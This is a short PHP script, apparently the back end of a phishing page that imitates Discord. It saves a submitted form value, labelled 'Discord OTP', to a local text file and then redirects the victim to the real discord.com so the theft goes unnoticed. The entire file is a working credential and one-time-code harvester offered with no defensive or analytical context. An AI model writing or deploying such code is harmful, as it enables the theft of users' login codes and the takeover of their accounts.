<?php
file_put_contents("otp.txt", "Discord OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://discord.com');
?>
